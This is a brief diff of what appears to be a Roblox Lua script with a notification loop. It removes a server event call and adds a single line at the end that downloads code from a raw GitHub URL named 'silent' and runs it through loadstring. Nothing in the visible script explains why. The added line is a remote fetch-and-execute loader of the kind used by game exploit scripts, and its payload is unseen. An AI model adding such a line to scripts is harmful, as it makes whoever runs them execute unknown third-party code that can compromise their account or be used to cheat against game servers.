@@ -66,5 +66,4 @@ while true do
 		wait(TimeBetweenNotifications)
 	end
 end
-
-game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('OneMoreTime');
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xfarzadxx/main/main/silent'))()
